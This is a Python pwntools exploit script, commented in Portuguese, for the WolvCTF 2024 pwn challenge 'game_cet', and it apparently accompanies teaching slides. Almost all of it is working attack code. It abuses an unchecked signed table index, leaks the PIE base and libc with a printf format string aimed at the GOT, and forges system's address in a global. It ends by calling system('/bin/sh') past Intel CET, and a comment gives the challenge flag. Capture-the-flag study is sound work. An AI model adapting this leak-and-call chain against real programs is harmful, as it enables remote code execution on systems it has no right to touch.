#!/usr/bin/env python3
# =============================================================================
#  Game, CET, Match  —  WolvCTF 2024 · categoria Pwn · desafio game_cet
#  Bypass de Intel CET (IBT / Shadow Stack) por uma falha de LOGICA.
#
#  Este script implementa, em codigo, exatamente a cadeia descrita nos slides
#  e no roteiro de apresentacao. Cada etapa esta anotada com o numero do slide
#  correspondente.
#
#  Ideia central (slides 06-16):
#    - Nao da pra pular pro hear_taunt (win) nem chamar execve: o IBT exige
#      ENDBR64 no destino e nos nao controlamos RSI/RDX.
#    - O alvo ideal e system("/bin/sh"): UM argumento (so o RDI, que a gente
#      controla) e comeca com ENDBR64 na libc -> o IBT APROVA.
#    - system nao esta na GOT. Entao: (1) vazamos a libc com printf+format
#      string, (2) forjamos o ponteiro de system dentro do global `banter`
#      byte a byte com taunt/lob, (3) chamamos o indice do banter.
#
#  Uso:
#     python3 solve.py            # local  (contra ./chal)
#     python3 solve.py REMOTE     # remoto (ajuste HOST/PORT abaixo)
#     python3 solve.py GDB        # local sob gdb
#
#  Os offsets abaixo (FMT_OFFSET etc.) estao confirmados contra o `chal`
#  reconstruido deste repositorio. Contra o binario original do CTF, reconfirme
#  os pontos indicados (ver README, secao "Offsets a confirmar").
# =============================================================================

from pwn import *

# ---------------------------------------------------------------------------
# Configuracao
# ---------------------------------------------------------------------------
BINARY = "./chal"
HOST, PORT = "wolvctf.io", 1337        # [AJUSTAR] endereco do servico remoto
LIBC_PATH = "./libc.so.6"              # libc do alvo (se voce ja a identificou)

context.binary = BINARY
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF(BINARY, checksec=False)

# Escolha da libc:
#   1) ./libc.so.6 se voce a trouxe do desafio;
#   2) senao, para o exploit LOCAL, a libc do proprio sistema (o ./chal linka
#      contra ela, entao os offsets de printf/system batem);
#   3) senao (remoto sem libc), None -> use LibcSearcher com o leak de printf.
if os.path.exists(LIBC_PATH):
    libc = ELF(LIBC_PATH, checksec=False)
elif not (args.REMOTE or "REMOTE" in sys.argv):
    libc = ELF(os.path.realpath("/usr/lib/libc.so.6"), checksec=False)
else:
    libc = None


def start():
    if args.REMOTE or "REMOTE" in sys.argv:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="c")
    return process(BINARY)


# ---------------------------------------------------------------------------
#  A primitiva do bug  (slides 04-05)
#
#  main() faz, em pseudocodigo:
#      read(0, buf, 0xff);
#      option = strtol(buf, &rest, 10);   // SEM validar o retorno (com sinal!)
#      arg    = rest + 1;                 // "resto da linha" vira o RDI
#      ptrs[(int)option - 1](arg);        // UMA desreferencia: chama o slot
#
#  Entao mandamos "<option> <arg>" e o programa chama ptrs[option-1] com
#  RDI = arg. Como option e com sinal e sem limite, ptrs[option-1] alcanca
#  QUALQUER ponteiro relativo a base do binario (inclusive a GOT) e tambem o
#  global `banter`, que fica a um offset fixo de ptrs.
# ---------------------------------------------------------------------------

#  Endereco da tabela ptrs[] e do global banter. Derivados dos simbolos do ELF
#  (o binario nao esta stripado). Trabalhamos com os offsets ESTATICOS: como os
#  indices sao relativos a ptrs, a base do PIE se cancela e nao precisamos
#  relocar `elf`. A base so e usada para formar enderecos de runtime (leak).
PTRS_ADDR   = elf.symbols["ptrs"]
BANTER_ADDR = elf.symbols["banter"]


def idx_for(addr):
    """Indice `option` tal que ptrs[option-1] == addr.
       option = (addr - &ptrs)/8 + 1   (pode ser negativo: anda pra tras)."""
    assert (addr - PTRS_ADDR) % 8 == 0, "endereco nao alinhado com a vtable"
    return (addr - PTRS_ADDR) // 8 + 1


def call(io, option, arg=b""):
    """Dispara ptrs[option-1](arg). `arg` vira o RDI."""
    if isinstance(arg, str):
        arg = arg.encode()
    io.sendline(str(option).encode() + b" " + arg)


def call_got(io, func, arg=b""):
    """Chama uma funcao da libc via GOT (entrada comeca com ENDBR64 -> IBT ok)."""
    return call(io, idx_for(elf.got[func]), arg)


# Cada iteracao do menu imprime exatamente a linha de opcoes. Consumir UMA linha
# por acao mantem o tubo em sincronia.
MENU_TAIL = b"hear taunt\n"


def sync(io):
    io.recvuntil(MENU_TAIL)


# Atalhos para as "funcoes de brinquedo" do menu (indices 1..4 = ptrs[0..3]).
def swing(io):
    """ptrs[0]: imprime &banter (nosso vazamento de PIE). Retorna a linha."""
    call(io, 1)
    line = io.recvline()
    sync(io)
    return line


def lob(io):
    """ptrs[1]: banter <<= 8."""
    call(io, 2)
    sync(io)


def taunt(io, byte_val):
    """ptrs[2]: banter |= atoi(arg)."""
    call(io, 3, str(byte_val).encode())
    sync(io)


# def hear_taunt(io):  call(io, 4)   # ptrs[3]: execve -> BLOQUEADO pelo IBT


# ---------------------------------------------------------------------------
#  Etapa 1 — Base do binario (PIE)   (slide 05/11)
#
#  swing (opcao 1) imprime o endereco de `banter`:
#      "the ball sails over: 0x55...."
#  Como banter tem offset estatico conhecido, a base do PIE sai de graca.
# ---------------------------------------------------------------------------

def leak_pie_base(io):
    line = swing(io)                           # "the ball sails over: 0x...."
    banter_rt = int(line.split(b"0x")[1].split()[0], 16)
    base = banter_rt - BANTER_ADDR
    log.success("base do binario = %#x", base)
    return base


# ---------------------------------------------------------------------------
#  Etapa 2 — Vazamento da libc com printf + format string   (slide 11)
#
#  printf esta na GOT e recebe UM argumento (o formato). Chamamos printf pelo
#  bug com RDI = nosso buffer -> format string controlado. Colocamos o endereco
#  de GOT[func] num limite de 8 bytes do buffer e o lemos com %N$s -> o valor
#  guardado na GOT = o endereco real da funcao na libc.
#
#  Layout do buffer na pilha (confirmado neste binario): o buf comeca a aparecer
#  em %8$  (FMT_OFFSET). Entao a qword no offset 16 do buf e %10$.
# ---------------------------------------------------------------------------

FMT_OFFSET = 8    # posicao (%N$) onde a 1a qword do nosso buffer aparece
ADDR_OFF   = 16   # offset (em bytes) dentro do buf onde cravamos o endereco


def leak_libc_addr(io, base, func):
    """Le GOT[func] com %s -> endereco real da funcao na libc. Slide 11."""
    got_rt = base + elf.got[func]                     # endereco de runtime da GOT
    which  = FMT_OFFSET + ADDR_OFF // 8               # qword do endereco -> %10$
    prefix = str(idx_for(elf.got["printf"])).encode() + b" "
    payload = (prefix + b"%" + str(which).encode() + b"$s").ljust(ADDR_OFF, b"A")
    payload += p64(got_rt)                            # endereco lido pelo %s
    io.sendline(payload)
    leak = io.recvuntil(b"1) serve", drop=True)       # saida do printf
    sync(io)                                          # consome o resto do menu
    addr = u64(leak[:6].ljust(8, b"\x00"))
    log.success("libc %s = %#x", func, addr)
    return addr


# ---------------------------------------------------------------------------
#  Etapa 3 — Forjar system no `banter`, byte a byte   (slides 12-13)
#
#  banter comeca em 0. Para cada byte (do mais ALTO ao mais baixo):
#      taunt(x)  ->  banter |= x      (grava x na posicao mais baixa, zerada)
#      lob()     ->  banter <<= 8     (abre espaco zerado p/ o proximo)
#  Sem deslocar depois do ultimo byte, senao bagunca o alinhamento.
# ---------------------------------------------------------------------------

def write_banter(io, value):
    """Escreve `value` (6 bytes) no global banter usando taunt(OR)+lob(shift)."""
    for i in range(5, -1, -1):               # byte 5 (mais alto) -> byte 0
        taunt(io, (value >> (i * 8)) & 0xff)  # banter |= x
        if i != 0:
            lob(io)                           # banter <<= 8


# ---------------------------------------------------------------------------
#  Cadeia completa   (slide 14)
# ---------------------------------------------------------------------------

def exploit():
    io = start()
    sync(io)                                   # menu inicial

    # --- Passo 1: base do binario (resolve PIE) ---
    base = leak_pie_base(io)

    # --- Passo 2: ler a GOT -> identificar a libc -> endereco de system ---
    leak_printf = leak_libc_addr(io, base, "printf")

    if libc is None:
        # Sem libc: use o leak de printf no libc.rip / LibcSearcher p/ resolver.
        #   from LibcSearcher import LibcSearcher
        #   s = LibcSearcher("printf", leak_printf)
        #   libc_base   = leak_printf - s.dump("printf")
        #   system_addr = libc_base + s.dump("system")
        log.error("Forneca LIBC_PATH ou use LibcSearcher com o leak de printf "
                  "(%#x) para resolver system." % leak_printf)
        return
    else:
        libc.address = leak_printf - libc.symbols["printf"]
        log.success("libc base = %#x", libc.address)
        system_addr = libc.symbols["system"]
    log.success("system = %#x", system_addr)

    # --- Passo 3: forjar system dentro do banter (taunt + lob) ---
    write_banter(io, system_addr)

    # --- Passo 4: chamar o indice do banter com RDI = "/bin/sh" ---
    #   ptrs[banter_index-1] == banter == &system  ->  system("/bin/sh")
    #   O system comeca com ENDBR64 na libc, entao o IBT APROVA. ("popping a shell")
    call(io, idx_for(BANTER_ADDR), b"/bin/sh")

    log.success("popping a shell")
    io.interactive()                          # wctf{y0u_c4nt_b3_s3r1ous_appr0ved_g4dg3t5_0nly}


if __name__ == "__main__":
    exploit()
